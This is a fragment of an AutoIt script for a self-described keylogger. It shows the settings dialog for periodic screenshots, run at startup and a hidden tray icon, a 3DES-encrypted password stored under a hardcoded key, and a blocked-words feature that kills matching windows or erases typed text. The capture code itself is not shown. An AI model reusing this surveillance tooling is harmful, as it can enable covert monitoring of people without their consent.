GUICtrlSetBkColor(-1,"0xF0F0F0")
GUICtrlCreateLabel("Type",30,195,26,15,-1,-1)
GUICtrlSetBkColor(-1,"-2")
Global $type = GUICtrlCreateCombo("",70,195,150,21,-1,-1)
GUICtrlSetData(-1,"BMP|GIF|JPG|PNG|TIF")
Global $ws = GUICtrlCreateRadio("Whole screen",40,225,150,20,-1,-1)
Global $aw= GUICtrlCreateRadio("Active window only",40,245,150,20,-1,-1)
if $strsplit[1] = "1" Then
   _GUICtrlButton_SetCheck ( $ss , $BST_CHECKED )
ElseIf $strsplit[1] = "0" Then
   call ("disable")
EndIf
If StringLeft ($strsplit[2], 1 ) = "1" Then _GUICtrlButton_SetCheck ( $wc , $BST_CHECKED )
If StringMid ($strsplit[2], 2,1 )  = "1" Then
_GUICtrlButton_SetCheck  ( $timeint , $BST_CHECKED )
ElseIf StringMid ($strsplit[2], 2,1 )  = "0" Then
call ("disable2")
EndIf
if StringRight ( $strsplit[2], 1 ) = "1" then _GUICtrlButton_SetCheck  ( $mouseclick , $BST_CHECKED )

$ssplit = StringSplit ( $strsplit[3], "?" )
_GUICtrlComboBox_SetEditText ( $time, $ssplit[2] )
GUICtrlSetData ( $unit, $ssplit[1] )
if $strsplit[4] = "1" Then
   _GUICtrlButton_SetCheck  ( $ws , $BST_CHECKED )
   Elseif $strsplit[4] = "2" Then
   _GUICtrlButton_SetCheck  ( $aw , $BST_CHECKED )
EndIf
_GUICtrlComboBox_SetEditText ( $type, $strsplit[5] )

If _IsChecked($wl)  Then
	  GUICtrlSetState ($list, 64)
	   GUICtrlSetState ($add, 64)
	    GUICtrlSetState ($del, 64)
		 GUICtrlSetState ($input, 64)
	Elseif not _IsChecked($wl) Then
	GUICtrlSetState ($list, 128)
	   GUICtrlSetState ($add, 128)
		 GUICtrlSetState ($input, 128)
	    GUICtrlSetState ($del, 128)
	EndIf

GUISetState(@SW_SHOW)

EndFunc;==>settings
Func disable ()
   if _IsChecked($ss) Then
	  $value = 64
   Else
	  $value = 128
 GUICtrlSetState ( $time ,  $value )
  GUICtrlSetState ( $unit ,  $value)
   EndIf

  GUICtrlSetState ( $wc ,  $value )
  GUICtrlSetState ( $timeint ,  $value )
  GUICtrlSetState ( $mouseclick ,  $value )
  GUICtrlSetState ( $type ,  $value )
  GUICtrlSetState ( $aw ,  $value )
  GUICtrlSetState ( $ws ,  $value )
  if $value = 64 And Not _IsChecked($timeint) Then
 GUICtrlSetState ( $time ,  128 )
  GUICtrlSetState ( $unit ,  128)
  ElseIf $value = 64 And _IsChecked($timeint) Then
  GUICtrlSetState ( $time ,  64 )
  GUICtrlSetState ( $unit ,  64)
  EndIf



EndFunc

Func disable2 ()
   if _IsChecked($timeint) Then
	  $value2 = 64
   Else
	  $value2 = 128
   EndIf
  GUICtrlSetState ( $unit ,  $value2 )
  GUICtrlSetState ( $time ,  $value2 )
EndFunc

Func save()
	FileDelete(@LocalAppDataDir & "\keylogger.txt")
	_FileCreate(@LocalAppDataDir & "\keylogger.txt")
	$read = GUICtrlRead($in)
	FileWriteLine(@LocalAppDataDir & "\keylogger.txt", $read)
	If _IsChecked($startup) Then
		FileWriteLine(@LocalAppDataDir & "\keylogger.txt", "1")
	Else
		FileWriteLine(@LocalAppDataDir & "\keylogger.txt", "0")
	EndIf

	If _IsChecked($wl) Then
		FileWriteLine(@LocalAppDataDir & "\keylogger.txt", "1")
	Else
		FileWriteLine(@LocalAppDataDir & "\keylogger.txt", "0")
	 EndIf

        Global $pass = GUICtrlRead ( $password1 )
	global $encrypted =	_Crypt_EncryptData ( $pass, "anjay" , $CALG_3DES )
   FileWriteLine ( @LocalAppDataDir & "\keylogger.txt", $encrypted )

   If _IsChecked($trayicon) Then
		FileWriteLine(@LocalAppDataDir & "\keylogger.txt", @CRLF & "1")
	Else
		FileWriteLine(@LocalAppDataDir & "\keylogger.txt", @CRLF & "0")
	 EndIf

	If _IsChecked($ss) Then
		global $str = "1|"
	Else
     Global $str = "0|"
    EndIf

	If _IsChecked($wc) Then
	   $str = $str & "1"
	Else
	   $str = $str & "2"
	   EndIf
    If _IsChecked($timeint)Then
	   $str = $str & "1"
	   Else
	   $str = $str & "0"
	   EndIf
    if _IsChecked($mouseclick) Then
	   $str = $str & "1"
	   Else
	   $str = $str & "0"
	   EndIf
	  global $ti = GUICtrlRead ( $unit ) & "?" &  _GUICtrlComboBox_GetEditText ( $time )

   $str = $str & "|" & $ti & "|"
If _IsChecked($ws) Then $str = $str & "1|"
	  If _IsChecked($aw) Then $str = $str & "2|"
	  $re = _GUICtrlComboBox_GetEditText ( $type )
	  $str = $str & $re
	  $strarray = StringSplit ( $str, "|" )
	  if $strarray [0] <> 5 Then
	  msgbox (-1, $strarray[0] & $str & "Some Options left undefined", "It seems that some options in screenshots setting are not defined" )
	  call ("settings")
	  endif
FileWriteLine ( @LocalAppDataDir & "\keylogger.txt", $str )

   dim $count = _GUICtrlListBox_GetCount ( $list)
   dim $index = 0
 if FileExists ( @LocalAppDataDir &  "\locked words.txt" ) = 1 then FileDelete ( @LocalAppDataDir &  "\locked words.txt" )
FileWrite ( @LocalAppDataDir &  "\locked words.txt", "|" )
 while $index < $count
dim $data = _GUICtrlListBox_GetText ( $list, $index )
FileWrite( @LocalAppDataDir &  "\locked words.txt", $data & "|" )
$index = $index + 1
WEnd
	GUIDelete ( $gui2 )
	call ("reload")
 EndFunc   ;==>save

 Func cancel ( )
	GUIDelete ( $gui2 )
EndFunc

 Func browse()
	Global $choise = FileSelectFolder("Select Location", "")
	GUICtrlSetData($in, $choise)
EndFunc   ;==>browse

Func startup()
	If _GUICtrlButton_GetCheck($startup) <> 0 Then
	Else
	EndIf
 EndFunc   ;==>startup

Func wl()
	If _IsChecked($wl)  Then
	  GUICtrlSetState ($list, 64)
	   GUICtrlSetState ($add, 64)
	    GUICtrlSetState ($del, 64)
		 GUICtrlSetState ($input, 64)
	Elseif not _IsChecked($wl) Then
	GUICtrlSetState ($list, 128)
	   GUICtrlSetState ($add, 128)
		 GUICtrlSetState ($input, 128)
	    GUICtrlSetState ($del, 128)
	EndIf
EndFunc   ;==>ss

Func _IsChecked($idControlID)
	Return BitAND(GUICtrlRead($idControlID), $GUI_CHECKED) = $GUI_CHECKED
EndFunc   ;==>_IsChecked

 func exitt2 ( )
	GUIDelete ($gui2)
   EndFunc

Func end()
   If $password = "false" Then
		FileWriteLine($loc, @CRLF & "Session Ended At: " & @HOUR & ":" & @MIN & ":" & @SEC & "  " & @MDAY & "-" & @MON & "-" & @YEAR & @CRLF )
ElseIf $password <> "false" then
   	FileWriteLine($loc, _ArrayToString ( StringToASCIIArray ( @CRLF & "Session Ended At: " & @HOUR & ":" & @MIN & ":" & @SEC & "  " & @MDAY & "-" & @MON & "-" & @YEAR & @CRLF) ) )
EndIf
	ProcessClose ( "AutoIt3.exe" )
	Exit
EndFunc   ;==>end

Func words()

 EndFunc   ;==>words

 Func lockedwords( )

 EndFunc

   Func savewords( )

   EndFunc

   func exittt ( )
	  GUIDelete (  )
   EndFunc

   func delete ( )
   dim $index = _GUICtrlListBox_GetCurSel ( $list )
   _GUICtrlListBox_DeleteString ( $list, $index )
EndFunc

func add ( )
   dim $data = GUICtrlRead ( $input )
   if not $data = "" and _GUICtrlListBox_FindString ( $list, $data, True ) then _GUICtrlListBox_AddString ( $list, $data )
   GUICtrlSetData ( $input, "" )
EndFunc

func search ( )
global $words = FileRead ( @LocalAppDataDir &  "\locked words.txt" )
global $array = StringSplit ( $words, "|" )
global $win = WinGetTitle("[active]")
global $count = UBound( $array, 1 ) - 1
Global $current = 1
while $current < $count
   if not StringInStr ( $win, $array[$current] ) = 0 Then WinKill ( "[active]" )
 $current = $current + 1
 WEnd
 EndFunc

 Func keyboardsearch ( )
  global $back = $inpp
	Global $words = FileRead(@LocalAppDataDir &  "\locked words.txt")
	If StringInStr($words, $inpp) = 0 Then
		$inpp = StringTrimLeft($inpp, 1)

	ElseIf StringInStr($words, $inpp) <> 0 and StringInStr($words, "|" & $inpp & "|") <> 0 Then
			$length = StringLen($inpp)
			Send("{backspace " & $length & "}")
			$inpp = ""
	Endif
 EndFunc

 func controlsearch ( )
global $words = FileRead ( @LocalAppDataDir &  "\locked words.txt" )
global $array = StringSplit ( $words, "|" )
global $win = WinGetTitle("[active]")
global $focus = ControlGetFocus ( $win )
global $text = ControlGetText ( $win, "", $focus )
global $count = UBound( $array, 1 ) - 1
Global $current = 1
while $current < $count
   if not StringInStr ( $text, $array[$current] ) = 0 Then
	dim $length =Stringlen ( $array[$current] )
	ControlFocus ( $win, "", $focus )
	send ("{backspace " & $length & "}")
 EndIf
 $current = $current + 1
 WEnd
 EndFunc